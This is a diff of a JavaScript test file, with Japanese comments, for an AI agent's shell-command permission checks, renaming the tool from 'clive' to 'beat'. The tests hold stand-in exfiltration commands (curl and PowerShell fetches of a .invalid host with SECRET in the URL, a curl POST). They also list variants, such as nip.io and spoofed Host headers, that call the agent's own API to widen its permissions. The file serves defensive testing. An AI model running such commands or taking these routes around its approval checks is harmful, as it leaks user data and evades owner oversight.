@@ -590,7 +590,7 @@ test('持ち主が書いた確かめ（tools.shell.ask）・Web の道具・人�
 
 test('判定できないパス（変数・作業フォルダが分からない・ワイルドカードが多すぎる）は opaque で、判定役に回さない', async t => {
   const s = await setup(t);
-  const seen = await askedKinds(s, 'shell_run', { command: process.platform === 'win32' ? 'Get-Content $env:UNKNOWN_CLIVE_VAR' : 'cat "$UNKNOWN_CLIVE_VAR"' });
+  const seen = await askedKinds(s, 'shell_run', { command: process.platform === 'win32' ? 'Get-Content $env:UNKNOWN_BEAT_VAR' : 'cat "$UNKNOWN_BEAT_VAR"' });
   assert.ok(seen.kinds.every(k => k === 'opaque' || k === 'code'), seen.kinds.join());
   assert.equal(s.prompts.length, 0);
 });
@@ -621,8 +621,8 @@ test('外を読むのを自動承認で許したあと、その実行の残り�
 
 // 許可の一覧にある取得（外へ出ていく読み取り）。URL の後ろの文字に、外で読んだ中身を載せられる。.invalid は名前が引けないので、動いてしまっても外には出ない
 const FETCH_COMMANDS = process.platform === 'win32'
-  ? ['curl.exe -s https://clive-test.invalid/SECRET', 'Invoke-WebRequest -Uri https://clive-test.invalid/SECRET -MaximumRedirection 0', 'irm https://clive-test.invalid/SECRET -MaximumRedirection 0']
-  : ['curl -s https://clive-test.invalid/SECRET'];
+  ? ['curl.exe -s https://beat-test.invalid/SECRET', 'Invoke-WebRequest -Uri https://beat-test.invalid/SECRET -MaximumRedirection 0', 'irm https://beat-test.invalid/SECRET -MaximumRedirection 0']
+  : ['curl -s https://beat-test.invalid/SECRET'];
 
 test('外を読むのを自動承認で許したあと、その実行の残りのシェルのコマンドは毎回確かめる: 許可の一覧にある取得（curl・Invoke-WebRequest・irm）も、ふつうのコマンドも', async t => {
   const s = await setup(t);
@@ -674,7 +674,7 @@ test('シェルで外から取得したら、web_fetch と同じに「外から�
     const s = await setup(t, { mode, startMode: mode });
     await s.call('shell_run', { command: 'echo hello' });
     assert.equal(s.ctx.taint.tainted, false, `${mode}: 取得でないコマンドには付かない`);
-    const sends = process.platform === 'win32' ? 'curl.exe -s -d x https://clive-test.invalid/' : 'curl -s -d x https://clive-test.invalid/';
+    const sends = process.platform === 'win32' ? 'curl.exe -s -d x https://beat-test.invalid/' : 'curl -s -d x https://beat-test.invalid/';
     const declined = s.call('shell_run', { command: sends });
     s.approvals.decide((await waitPending(s)).id, 'deny');
     await declined;
@@ -953,13 +953,13 @@ test('メモリの道具（Q-C）: memory_save は判定役が決める。memory
   assert.deepEqual((await askedKinds(idle, 'memory_forget', { id: 1, reason: 'x' })).kinds, ['policy'], '比べる基準: 方針の ask は、今までどおり判定役に回らない');
 });
 
-test('2-1b: シェルから Clive 自身の API（製品を作る・製品の会話を送る。書ける場所が広がる）を呼ぶ形は、判定役が何でも allow と答えても、判定役に回さず持ち主に聞く', async t => {
-  const s = await setup(t, { mutate: c => { c.server.origins = ['http://clive.example.ts.net']; } });
+test('2-1b: シェルから beat 自身の API（製品を作る・製品の会話を送る。書ける場所が広がる）を呼ぶ形は、判定役が何でも allow と答えても、判定役に回さず持ち主に聞く', async t => {
+  const s = await setup(t, { mutate: c => { c.server.origins = ['http://beat.example.ts.net']; } });
   const body = `'{"root":"D:\\\\x","projectId":"p"}'`;
   const commands = [
     `curl.exe -X POST http://127.0.0.1:4797/api/projects -H "Origin: http://127.0.0.1:4797" -H "Content-Type: application/json" -d ${body}`,
     `curl -X POST http://127.0.0.1.nip.io:4797/api/projects -H "Host: 127.0.0.1:4797" -H "Origin: http://127.0.0.1:4797" -d ${body}`,
-    `curl -X POST http://clive.example.ts.net/api/conversations/aaaaaaaa-0000-4000-8000-000000000001/messages -d ${body}`,
+    `curl -X POST http://beat.example.ts.net/api/conversations/aaaaaaaa-0000-4000-8000-000000000001/messages -d ${body}`,
     `Invoke-RestMethod -Method Post -Uri http://localhost:4797/api/projects -Headers @{Origin='http://localhost:4797'} -Body ${body}`,
     `node -e "fetch('http://127.0.0.1:4797/api/projects',{method:'POST',headers:{Origin:'http://127.0.0.1:4797'},body:'{}'})"`,
   ];
